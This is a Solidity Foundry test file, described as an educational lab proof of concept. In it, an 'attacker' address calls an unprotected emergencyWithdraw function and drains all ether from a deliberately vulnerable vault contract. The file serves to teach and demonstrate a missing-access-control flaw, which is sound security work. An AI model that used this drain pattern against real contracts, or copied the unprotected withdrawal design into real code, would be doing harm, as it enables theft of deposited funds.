// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";

/// @notice Educational PoC: missing access control on emergencyWithdraw.
/// @dev Lab-only. Do not deploy VulnerableVault with real funds.
contract VulnerableVaultTest is Test {
    VulnerableVault internal vault;
    address internal attacker = address(0xBEEF);

    function setUp() public {
        vault = new VulnerableVault();
    }

    function testUnauthorizedEmergencyWithdrawDrainsVault() public {
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 10 ether}();
        assertEq(address(vault).balance, 10 ether);

        uint256 beforeBal = attacker.balance;
        vm.prank(attacker);
        vault.emergencyWithdraw();

        assertEq(address(vault).balance, 0);
        assertEq(attacker.balance, beforeBal + 10 ether);
    }

    receive() external payable {}
}
